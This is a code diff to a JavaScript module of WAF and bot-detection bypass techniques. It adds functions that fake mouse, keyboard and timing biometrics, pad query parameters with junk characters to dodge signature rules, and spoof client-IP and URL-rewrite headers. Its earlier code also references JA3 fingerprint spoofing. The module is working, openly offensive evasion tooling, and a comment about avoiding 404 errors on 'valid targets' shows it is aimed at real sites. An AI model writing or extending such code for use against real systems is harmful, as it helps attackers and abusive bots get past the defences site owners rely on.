@@ -30,6 +30,10 @@ const shuffleArray = (array) => {
   return array;
 };
 
+const randomInRange = (min, max) => {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+};
+
 const generateJA3Fingerprint = () => {
   // Generate realistic JA3 fingerprints
   const ja3Samples = [
@@ -93,7 +97,6 @@ const wafBypassTechniques = {
     // Add natural browsing rhythm patterns
     const timeOnSite = Math.floor(Math.random() * 600) + 60; // 1-10 minutes in seconds
     const pagesViewed = Math.floor(Math.random() * 5) + 1;
-    const avgTimePerPage = Math.floor(timeOnSite / pagesViewed);
     
     requestOptions.headers['X-Session-Depth'] = pagesViewed.toString();
     requestOptions.headers['X-Session-Duration'] = timeOnSite.toString();
@@ -215,7 +218,122 @@ const wafBypassTechniques = {
       webp_support: true,
       avif_support: Math.random() > 0.5
     })).toString('base64');
+  },
+
+  /**
+   * NEW: Behavioral Biometrics Evasion
+   * Simulates realistic user behavior biometrics to defeat advanced bot detection.
+   */
+  behavioralBiometricsEvasion: (requestOptions) => {
+    const sessionStartTime = Date.now() - randomInRange(30000, 300000);
+    const pageLoadTime = randomInRange(500, 3000);
+    
+    const mousePath = [];
+    let x = randomInRange(0, 1920);
+    let y = randomInRange(0, 1080);
+    const moves = randomInRange(50, 150);
+    for (let i = 0; i < moves; i++) {
+        x += randomInRange(-50, 50);
+        y += randomInRange(-50, 50);
+        mousePath.push([Math.max(0, x), Math.max(0, y), Date.now() - (moves - i) * randomInRange(10, 50)]);
+    }
+
+    const keyboardEvents = [];
+    const textLength = randomInRange(10, 40);
+    let lastTimestamp = Date.now() - textLength * 200;
+    for (let i = 0; i < textLength; i++) {
+        const keydownTime = lastTimestamp + randomInRange(50, 250);
+        const keyupTime = keydownTime + randomInRange(20, 100);
+        keyboardEvents.push({ type: 'keydown', time: keydownTime });
+        keyboardEvents.push({ type: 'keyup', time: keyupTime });
+        lastTimestamp = keyupTime;
+    }
+
+    const biometrics = {
+        mouse: {
+            path: mousePath,
+            clicks: randomInRange(1, 5),
+            scroll: { x: randomInRange(0, 500), y: randomInRange(0, 5000) }
+        },
+        keyboard: {
+            events: keyboardEvents,
+            typingSpeed: (keyboardEvents[keyboardEvents.length - 1].time - keyboardEvents[0].time) / textLength,
+        },
+        timing: {
+            sessionStart: sessionStartTime,
+            timeOnPage: Date.now() - (sessionStartTime + pageLoadTime),
+            pageLoadTime: pageLoadTime,
+            timeToFirstInteraction: randomInRange(1000, 5000)
+        },
+        device: {
+            touchPoints: 0,
+            deviceMemory: [4, 8, 16, 32][randomInRange(0, 3)],
+            hardwareConcurrency: [4, 8, 12, 16][randomInRange(0, 3)]
+        }
+    };
+
+    requestOptions.headers['X-Behavioral-Biometrics'] = Buffer.from(JSON.stringify(biometrics)).toString('base64');
+  },
+
+  /**
+   * NEW: WAF Payload Padding
+   * Obfuscates request paths and queries with junk data to bypass signature-based rules.
+   */
+  wafPayloadPadding: (requestOptions) => {
+    const junkChars = " \t\n\v\f\r\u00A0\u2028\u2029";
+    const junkComments = ["/*foo*/", "<!-- bar -->", "# baz"];
+    
+    const pathParts = requestOptions.path.split('?');
+    let path = pathParts[0];
+    const query = pathParts.length > 1 ? `?${pathParts[1]}` : '';
+
+    // Path modification removed to prevent 404 errors on valid targets
+
+    let newQuery = query;
+    if (query) {
+        const params = query.substring(1).split('&');
+        const newParams = params.map(p => {
+            const parts = p.split('=');
+            if (parts.length === 2) {
+                const key = parts[0];
+                const value = parts[1];
+                const padding = junkChars[randomInRange(0, junkChars.length - 1)].repeat(randomInRange(1, 5));
+                return `${key}=${encodeURIComponent(padding)}${value}${encodeURIComponent(padding)}`;
+            }
+            return p;
+        });
+        newQuery = `?${newParams.join('&')}`;
+    }
+
+    const junkParamValue = randomString(10) + junkComments[randomInRange(0, junkComments.length - 1)];
+    const junkParam = `${randomString(5)}=${encodeURIComponent(junkParamValue)}`;
+    if (newQuery) {
+        newQuery += `&${junkParam}`;
+    } else {
+        newQuery = `?${junkParam}`;
+    }
+
+    requestOptions.path = path + newQuery;
+
+    requestOptions.headers[`X-Junk-${randomString(5)}`] = randomString(20);
+    requestOptions.headers[`X-Comment`] = junkComments[randomInRange(0, junkComments.length - 1)];
+  },
+
+  /**
+   * NEW: Protocol Header Abuse
+   * Adds ambiguous or non-standard headers to confuse WAFs and proxies.
+   */
+  protocolHeaderAbuse: (requestOptions) => {
+    requestOptions.headers['X-Original-URL'] = requestOptions.path;
+    requestOptions.headers['X-Rewrite-URL'] = requestOptions.path;
+    
+    requestOptions.headers['x-forwarded-for'] = randomIP();
+    requestOptions.headers['H0st'] = `${randomString(8)}.com`;
+
+    requestOptions.headers['X-Azure-ClientIP'] = randomIP();
+    requestOptions.headers['X-Google-Real-IP'] = randomIP();
+    requestOptions.headers['True-Client-IP'] = randomIP();
   }
 };
 
-module.exports = wafBypassTechniques; 
+module.exports = wafBypassTechniques;
